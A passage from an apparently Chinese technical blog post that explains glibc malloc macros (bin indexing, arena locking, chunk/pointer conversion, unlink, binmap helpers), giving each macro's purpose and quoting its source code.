<li>获取指针M指向arena上的unsorted bin地址</li>
</ul>
</li>
<li>
<p>源代码</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* The otherwise unindexable 1-bin is used to hold unsorted chunks. */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> unsorted_chunks(M)          (bin_at (M, 1))</span></span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
</ol>
<h2 id="largebin-相关宏定义">largebin 相关宏定义</h2>
<ol>
<li><code>largebin_index(sz)</code>
<ul>
<li>
<p>用处</p>
<ul>
<li>根据所请求的chunk大小，获取largebin中对应的索引</li>
</ul>
</li>
<li>
<p>源代码</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> largebin_index(sz) \</span></span><br><span class="line">  (SIZE_SZ == <span class="number">8</span> ? largebin_index_64 (sz)                                     \</span><br><span class="line">  : MALLOC_ALIGNMENT == <span class="number">16</span> ? largebin_index_32_big (sz)                     \</span><br><span class="line">  : largebin_index_32 (sz))</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> largebin_index_32(sz)                                                \</span></span><br><span class="line">  (((((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">6</span>) &lt;= <span class="number">38</span>) ?  <span class="number">56</span> + (((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">6</span>) :\</span><br><span class="line">  ((((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">9</span>) &lt;= <span class="number">20</span>) ?  <span class="number">91</span> + (((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">9</span>) :\</span><br><span class="line">  ((((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">12</span>) &lt;= <span class="number">10</span>) ? <span class="number">110</span> + (((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">12</span>) :\</span><br><span class="line">  ((((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">15</span>) &lt;= <span class="number">4</span>) ? <span class="number">119</span> + (((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">15</span>) :\</span><br><span class="line">  ((((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">18</span>) &lt;= <span class="number">2</span>) ? <span class="number">124</span> + (((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">18</span>) :\</span><br><span class="line">  <span class="number">126</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> largebin_index_32_big(sz)                                            \</span></span><br><span class="line">  (((((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">6</span>) &lt;= <span class="number">45</span>) ?  <span class="number">49</span> + (((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">6</span>) :\</span><br><span class="line">  ((((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">9</span>) &lt;= <span class="number">20</span>) ?  <span class="number">91</span> + (((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">9</span>) :\</span><br><span class="line">  ((((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">12</span>) &lt;= <span class="number">10</span>) ? <span class="number">110</span> + (((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">12</span>) :\</span><br><span class="line">  ((((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">15</span>) &lt;= <span class="number">4</span>) ? <span class="number">119</span> + (((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">15</span>) :\</span><br><span class="line">  ((((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">18</span>) &lt;= <span class="number">2</span>) ? <span class="number">124</span> + (((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">18</span>) :\</span><br><span class="line">  <span class="number">126</span>)</span><br><span class="line"></span><br><span class="line">  <span class="comment">// XXX It remains to be seen whether it is good to keep the widths of</span></span><br><span class="line">  <span class="comment">// XXX the buckets the same or whether it should be scaled by a factor</span></span><br><span class="line">  <span class="comment">// XXX of two as well.</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> largebin_index_64(sz)                                                \</span></span><br><span class="line">  (((((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">6</span>) &lt;= <span class="number">48</span>) ?  <span class="number">48</span> + (((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">6</span>) :\</span><br><span class="line">  ((((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">9</span>) &lt;= <span class="number">20</span>) ?  <span class="number">91</span> + (((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">9</span>) :\</span><br><span class="line">  ((((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">12</span>) &lt;= <span class="number">10</span>) ? <span class="number">110</span> + (((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">12</span>) :\</span><br><span class="line">  ((((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">15</span>) &lt;= <span class="number">4</span>) ? <span class="number">119</span> + (((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">15</span>) :\</span><br><span class="line">  ((((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">18</span>) &lt;= <span class="number">2</span>) ? <span class="number">124</span> + (((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">18</span>) :\</span><br><span class="line">  <span class="number">126</span>)</span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
</ol>
<h2 id="其他通用宏定义">其他通用宏定义</h2>
<ol>
<li>
<p><code>atomic_forced_read(x)</code></p>
<ul>
<li>
<p>用处</p>
<ul>
<li>使用内联汇编，在 <strong>线程间</strong> 安全的读取某个变量</li>
</ul>
</li>
<li>
<p>源代码</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta"># <span class="meta-keyword">define</span> atomic_forced_read(x) \</span></span><br><span class="line">(&#123; __typeof (x) __x; __asm (<span class="string">""</span> : <span class="string">"=r"</span> (__x) : <span class="string">"0"</span> (x)); __x; &#125;)</span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
<li>
<p><code>__builtin_expect(expr, val)</code></p>
<ul>
<li>
<p>用处</p>
<ul>
<li>返回expr的值；val为人工预测expr返回的值。该特殊宏定义可以提高CPU分支预测的准确性，加快CPU的执行速度</li>
<li>注意！这个宏定义只是 <strong>预测</strong> 该条件的结果，并没有对值进行任何修改</li>
</ul>
</li>
<li>
<p>源代码</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta"># <span class="meta-keyword">define</span> __builtin_expect(expr, val) (expr)</span></span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
<li>
<p><code>__glibc_unlikely(cond)</code></p>
<ul>
<li>
<p>用处</p>
<ul>
<li>预测表达式cond的结果为假 <strong>（不修改返回值）</strong></li>
</ul>
</li>
<li>
<p>源代码</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta"># <span class="meta-keyword">define</span> __glibc_unlikely(cond) __builtin_expect ((cond), 0)</span></span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
<li>
<p><code>__glibc_likely(cond)</code></p>
<ul>
<li>
<p>用处</p>
<ul>
<li>预测表达式cond的结果为真 <strong>（不修改返回值）</strong></li>
</ul>
</li>
<li>
<p>源代码</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta"># <span class="meta-keyword">define</span> __glibc_likely(cond) __builtin_expect ((cond), 1)</span></span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
<li>
<p><code>arena_get(ptr, size)</code></p>
<ul>
<li>
<p>用处</p>
<ul>
<li>获取当前线程的arena(可能获得main_arena)，并将指针ptr设置为获取到的arena地址</li>
<li>之后锁定该arena</li>
</ul>
</li>
<li>
<p>源代码</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> arena_get(ptr, size) do &#123; \</span></span><br><span class="line">  ptr = thread_arena;      \</span><br><span class="line">  arena_lock (ptr, size);      \</span><br><span class="line">&#125; <span class="keyword">while</span> (<span class="number">0</span>)</span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
<li>
<p><code>arena_lock(ptr, size)</code></p>
<ul>
<li>
<p>用处</p>
<ul>
<li>锁定指针ptr指向的arena，以保证对该arena操作时是 <strong>线程安全</strong> 的</li>
</ul>
</li>
<li>
<p>源代码</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> arena_lock(ptr, size) do &#123;      \</span></span><br><span class="line">  <span class="keyword">if</span> (ptr &amp;&amp; !arena_is_corrupt (ptr))     \</span><br><span class="line">      (<span class="keyword">void</span>) mutex_lock (&amp;ptr-&gt;mutex);      \</span><br><span class="line">  <span class="keyword">else</span>      \</span><br><span class="line">      ptr = arena_get2 ((size), <span class="literal">NULL</span>);      \</span><br><span class="line">&#125; <span class="keyword">while</span> (<span class="number">0</span>)</span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
<li>
<p><code>mutex_unlock(m)</code></p>
<ul>
<li>
<p>用处</p>
<ul>
<li>对指针m指向的单元进行 <strong>线程解锁</strong></li>
</ul>
</li>
<li>
<p>源代码</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta"># <span class="meta-keyword">define</span> mutex_unlock(m)        (*(m) = 0)</span></span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
<li>
<p><code>assert(expr)</code></p>
<ul>
<li>
<p>用处</p>
<ul>
<li>如果表达式expr为假，则输出错误信息并异常退出（抛出<code>SIGABRT</code>信号）</li>
</ul>
</li>
<li>
<p>源代码</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta"># <span class="meta-keyword">define</span> assert(expr) \</span></span><br><span class="line">  ((expr)      \</span><br><span class="line">  ? ((<span class="keyword">void</span>) <span class="number">0</span>)      \</span><br><span class="line">  : __malloc_assert (#expr, __FILE__, __LINE__, __func__))</span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
<li>
<p><code>chunk_is_mmapped(p)</code></p>
<ul>
<li>
<p>用处</p>
<ul>
<li>判断指针p指向的chunk是否通过mmap函数分配</li>
</ul>
</li>
<li>
<p>源代码</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> chunk_is_mmapped(p) ((p)-&gt;size &amp; IS_MMAPPED)</span></span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
<li>
<p><code>chunk2mem(p)</code></p>
<ul>
<li>
<p>用处</p>
<ul>
<li>将指向chunk header的指针，通过添加偏移，变更为用户使用的指针</li>
</ul>
</li>
<li>
<p>源代码</p>
 <figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> chunk2mem(p)   ((void*)((char*)(p) + 2*SIZE_SZ))</span></span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
<li>
<p><code>mem2chunk(mem)</code></p>
<ul>
<li>
<p>用处</p>
<ul>
<li>将用户使用的指针，通过减小偏移，变更为指向chunk header的指针</li>
</ul>
</li>
<li>
<p>源代码</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> mem2chunk(mem) ((mchunkptr)((char*)(mem) - 2*SIZE_SZ))</span></span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
<li>
<p><code>arena_for_chunk(ptr)</code></p>
<ul>
<li>
<p>用处</p>
<ul>
<li>获取指针ptr指向的chunk，其所属的arena地址</li>
</ul>
</li>
<li>
<p>源代码</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> arena_for_chunk(ptr) \</span></span><br><span class="line">  (chunk_non_main_arena (ptr) ? heap_for_ptr (ptr)-&gt;ar_ptr : &amp;main_arena)</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> chunk_non_main_arena(p) ((p)-&gt;size &amp; NON_MAIN_ARENA)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> heap_for_ptr(ptr) \</span></span><br><span class="line">  ((heap_info *) ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (ptr) &amp; ~(HEAP_MAX_SIZE - <span class="number">1</span>)))</span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
<li>
<p><code>request2size(req)</code></p>
<ul>
<li>
<p>用处</p>
<ul>
<li>根据用户申请的内存大小req，计算出待申请的chunk的大小</li>
</ul>
</li>
<li>
<p>源代码</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> request2size(req)                                         \</span></span><br><span class="line">  (((req) + SIZE_SZ + MALLOC_ALIGN_MASK &lt; MINSIZE)  ?             \</span><br><span class="line">  MINSIZE :                                                      \</span><br><span class="line">  ((req) + SIZE_SZ + MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK)</span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
<li>
<p><code>checked_request2size(req, sz)</code></p>
<ul>
<li>
<p>用处</p>
<ul>
<li>该宏定义的主要功能在glibc中是这样声明的
<blockquote>
<p>Check if a request is so large that it would wrap around zero when padded and aligned.</p>
</blockquote>
</li>
<li>判断用户申请的内存大小是否 <strong>非常大</strong>，大到以至于在添加堆头与内存对齐之后，<code>size_t</code>类型的堆块大小有可能上溢至0</li>
<li>如果用户申请的内存大小req 正常，则由用户所需的内存大小，计算出将要申请的chunk的大小，并将该值赋给变量sz</li>
</ul>
</li>
<li>
<p>源代码</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> checked_request2size(req, sz)\</span></span><br><span class="line">  <span class="keyword">if</span> (REQUEST_OUT_OF_RANGE (req)) &#123;      \</span><br><span class="line">      __set_errno (ENOMEM);      \</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;      \</span><br><span class="line">      &#125;      \</span><br><span class="line">  (sz) = request2size (req);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> REQUEST_OUT_OF_RANGE(req)                                 \</span></span><br><span class="line">  ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (req) &gt;=      \</span><br><span class="line">  (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (INTERNAL_SIZE_T) (<span class="number">-2</span> * MINSIZE))</span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
<li>
<p><code>bin_at(m, i)</code></p>
<ul>
<li>
<p>用处</p>
<ul>
<li>获取arena上的bins数组中，对应索引的bin地址</li>
<li>指针m指向待使用的arena，变量i为待使用bin的索引</li>
</ul>
</li>
<li>
<p>源代码</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* addressing -- note that bin_at(0) does not exist */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> bin_at(m, i) \</span></span><br><span class="line">(mbinptr) (((<span class="keyword">char</span> *) &amp;((m)-&gt;bins[((i) - <span class="number">1</span>) * <span class="number">2</span>]))      \</span><br><span class="line">          - offsetof (struct malloc_chunk, fd))</span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
<li>
<p><code>first(b)</code> / <code>last(b)</code></p>
<ul>
<li>
<p>用处</p>
<ul>
<li>获取该bin的第一个chunk的地址 / 最后一个chunk的地址</li>
<li>指针b指向待使用的chunk</li>
</ul>
</li>
<li>
<p>源代码</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Reminders about list directionality within bins */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> first(b)     ((b)-&gt;fd)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> last(b)      ((b)-&gt;bk)</span></span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
<li>
<p><code>set_inuse_bit_at_offset(p, s)</code></p>
<ul>
<li>
<p>用处</p>
<ul>
<li>为当前chunk的下一个相邻chunk设置<code>PREV_INUSE</code>标志位，以说明被设置<code>PREV_INUSE</code>的chunk的上一个chunk已被分配</li>
</ul>
</li>
<li>
<p>源代码</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> set_inuse_bit_at_offset(p, s)      \</span></span><br><span class="line">  (((mchunkptr) (((<span class="keyword">char</span> *) (p)) + (s)))-&gt;size |= PREV_INUSE)</span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
<li>
<p><code>check_malloced_chunk(A, P, N)</code></p>
<ul>
<li>
<p>用处</p>
<ul>
<li>调用函数来检测指针P指向的chunk是否异常</li>
<li>参数A为arena地址、参数P为chunk地址、参数N为chunk的大小</li>
</ul>
</li>
<li>
<p>源代码</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta"># <span class="meta-keyword">define</span> check_malloced_chunk(A, P, N)   do_check_malloced_chunk (A, P, N)</span></span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
<li>
<p><code>chunksize(p)</code></p>
<ul>
<li>
<p>用处</p>
<ul>
<li>返回受指针p指向的chunk，其除去各种标志位后的的大小</li>
</ul>
</li>
<li>
<p>源代码</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  Bits to mask off when extracting size</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">  Note: IS_MMAPPED is intentionally not masked off from size field in</span></span><br><span class="line"><span class="comment">  macros for which mmapped chunks should never be seen. This should</span></span><br><span class="line"><span class="comment">  cause helpful core dumps to occur if it is tried by accident by</span></span><br><span class="line"><span class="comment">  people extending or adapting this malloc.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SIZE_BITS (PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Get size, ignoring use bits */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> chunksize(p)         ((p)-&gt;size &amp; ~(SIZE_BITS))</span></span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
<li>
<p><code>chunk_at_offset(p, s)</code></p>
<ul>
<li>
<p>用处</p>
<ul>
<li>返回chunk <code>p</code> 偏移 <code>s</code> 个单位后的地址</li>
</ul>
</li>
<li>
<p>源代码</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Treat space at ptr + offset as a chunk */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> chunk_at_offset(p, s)  ((mchunkptr) (((char *) (p)) + (s)))</span></span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
<li>
<p><code>set_head(p, s)</code></p>
<ul>
<li>
<p>用处</p>
<ul>
<li>设置chunk <code>p</code> 的 size成员为变量<code>s</code></li>
</ul>
</li>
<li>
<p>源代码</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Set size/use field */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> set_head(p, s)       ((p)-&gt;size = (s))</span></span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
<li>
<p><code>set_foot(p, s)</code></p>
<ul>
<li>
<p>用处</p>
<ul>
<li>设置chunk <code>p</code> 下一个chunk 的 prev_size成员为变量<code>s</code></li>
<li>这个设置当且仅当 <em>被设置prev_size的chunk</em> 的上一个chunk为free chunk时才有效</li>
</ul>
</li>
<li>
<p>源代码</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Set size at footer (only when chunk is not in use) */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> set_foot(p, s)       (((mchunkptr) ((char *) (p) + (s)))-&gt;prev_size = (s)))</span></span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
<li>
<p><code>unlink(AV, P, BK, FD)</code></p>
<ul>
<li>
<p>用处</p>
<ul>
<li>将该chunk从bin链上断开连接</li>
</ul>
</li>
<li>
<p>源代码</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Take a chunk off a bin list */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> unlink(AV, P, BK, FD) &#123;                                            \</span></span><br><span class="line">    FD = P-&gt;fd;      \</span><br><span class="line">    BK = P-&gt;bk;      \</span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="number">0</span>))      \</span><br><span class="line">      malloc_printerr (check_action, <span class="string">"corrupted double-linked list"</span>, P, AV);  \</span><br><span class="line">    <span class="keyword">else</span> &#123;      \</span><br><span class="line">        FD-&gt;bk = BK;      \</span><br><span class="line">        BK-&gt;fd = FD;     \</span><br><span class="line">        <span class="keyword">if</span> (!in_smallbin_range (P-&gt;size)     \</span><br><span class="line">            &amp;&amp; __builtin_expect (P-&gt;fd_nextsize != <span class="literal">NULL</span>, <span class="number">0</span>)) &#123;      \</span><br><span class="line">      <span class="keyword">if</span> (__builtin_expect (P-&gt;fd_nextsize-&gt;bk_nextsize != P, <span class="number">0</span>)      \</span><br><span class="line">    || __builtin_expect (P-&gt;bk_nextsize-&gt;fd_nextsize != P, <span class="number">0</span>))    \</span><br><span class="line">        malloc_printerr (check_action,     \</span><br><span class="line">            <span class="string">"corrupted double-linked list (not small)"</span>,    \</span><br><span class="line">            P, AV);      \</span><br><span class="line">            <span class="keyword">if</span> (FD-&gt;fd_nextsize == <span class="literal">NULL</span>) &#123;      \</span><br><span class="line">                <span class="keyword">if</span> (P-&gt;fd_nextsize == P)      \</span><br><span class="line">                  FD-&gt;fd_nextsize = FD-&gt;bk_nextsize = FD;     \</span><br><span class="line">                <span class="keyword">else</span> &#123;      \</span><br><span class="line">                    FD-&gt;fd_nextsize = P-&gt;fd_nextsize;      \</span><br><span class="line">                    FD-&gt;bk_nextsize = P-&gt;bk_nextsize;      \</span><br><span class="line">                    P-&gt;fd_nextsize-&gt;bk_nextsize = FD;      \</span><br><span class="line">                    P-&gt;bk_nextsize-&gt;fd_nextsize = FD;     \</span><br><span class="line">                  &#125;      \</span><br><span class="line">              &#125; <span class="keyword">else</span> &#123;      \</span><br><span class="line">                P-&gt;fd_nextsize-&gt;bk_nextsize = P-&gt;bk_nextsize;      \</span><br><span class="line">                P-&gt;bk_nextsize-&gt;fd_nextsize = P-&gt;fd_nextsize;      \</span><br><span class="line">              &#125;      \</span><br><span class="line">          &#125;      \</span><br><span class="line">      &#125;      \</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
<li>
<p><code>next_bin(b)</code></p>
<ul>
<li>
<p>用处</p>
<ul>
<li>返回下一个bin链的地址</li>
</ul>
</li>
<li>
<p>源代码</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* analog of ++bin */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> next_bin(b)  ((mbinptr) ((char *) (b) + (sizeof (mchunkptr) &lt;&lt; 1)))</span></span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
<li>
<p><code>idx2block(i)</code></p>
<ul>
<li>
<p>用处</p>
<ul>
<li>返回传入的索引对应的binmap索引</li>
</ul>
</li>
<li>
<p>源代码</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BINMAPSHIFT      5</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> idx2block(i)     ((i) &gt;&gt; BINMAPSHIFT)</span></span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
<li>
<p><code>mark_bin(m, i)</code></p>
<ul>
<li>
<p>用处</p>
<ul>
<li>在arena上binmap的对应索引处设置标记，以表示当前索引的large bin非空</li>
</ul>
</li>
<li>
<p>源代码</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> mark_bin(m, i)    ((m)-&gt;binmap[idx2block (i)] |= idx2bit (i))</span></span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
<li>
<p><code>unmark_bin(m, i)</code></p>
<ul>
<li>
<p>用处</p>
<ul>
<li>在arena上binmap的对应索引处解除标记，以表示当前索引的large bin为空</li>
</ul>
</li>
<li>
<p>源代码</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> unmark_bin(m, i)  ((m)-&gt;binmap[idx2block (i)] &amp;= ~(idx2bit (i)))</span></span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
<li>
<p><code>get_binmap(m, i)</code></p>
<ul>
<li>
<p>用处</p>
<ul>
<li>获取arena上binmap对应索引的值，以获得对应bin的状态</li>
</ul>
</li>
<li>
<p>源代码</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> get_binmap(m, i)  ((m)-&gt;binmap[idx2block (i)] &amp; idx2bit (i))</span></span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
<li>
<p><code>MINSIZE</code></p>
<ul>
<li>
<p>用处</p>
<ul>
<li>一个宏常量，表示最小可配分配的chunk大小，通常为 0x10字节（32位） / 0x20字节（64位）</li>
</ul>
</li>
<li>
<p>源代码</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* The smallest possible chunk */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MIN_CHUNK_SIZE        (offsetof(struct malloc_chunk, fd_nextsize))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* The smallest size we can malloc is an aligned minimal chunk */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MINSIZE  \</span></span><br><span class="line">  (<span class="keyword">unsigned</span> <span class="keyword">long</span>)(((MIN_CHUNK_SIZE+MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK))</span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
<li>
<p><code>misaligned_chunk(p)</code></p>
<ul>
<li>
<p>用处</p>
<ul>
<li>用于校验地址是否是按 2SIZE_SZ 对齐</li>
</ul>
</li>
<li>
<p>源代码</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> misaligned_chunk(p) \</span></span><br><span class="line">  ((<span class="keyword">uintptr_t</span>)(MALLOC_ALIGNMENT == <span class="number">2</span> * SIZE_SZ ? (p) : chunk2mem (p)) \</span><br><span class="line">  &amp; MALLOC_ALIGN_MASK)</span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
<li>
<p><code>aligned_OK(m)</code></p>
<ul>
<li>
<p>用处</p>
<ul>
<li>判断当前chunk是否对齐了内存</li>
</ul>
</li>
<li>
<p>源代码</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> aligned_OK(m)  (((unsigned long)(m) &amp; MALLOC_ALIGN_MASK) == 0)</span></span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
<li>
<p><code>set_fastchunks(M)</code></p>
<ul>
<li>
<p>用处</p>
<ul>
<li>设置arena上关于fastbin的标志位</li>
</ul>
</li>
<li>
<p>源代码</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> set_fastchunks(M)      catomic_and (&amp;(M)-&gt;flags, ~FASTCHUNKS_BIT)</span></span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
<li>
<p><code>prev_inuse(p)</code></p>
<ul>
<li>
<p>用处</p>
<ul>
<li>判断当前chunk是否设置了prev_inuse（即上一个chunk是否已经被分配了）</li>
</ul>
</li>
<li>
<p>源代码</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> prev_inuse(p)       ((p)-&gt;size &amp; PREV_INUSE)</span></span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
<li>
<p><code>FASTBIN_CONSOLIDATION_THRESHOLD</code></p>
<ul>
<li>
<p>源代码</p>
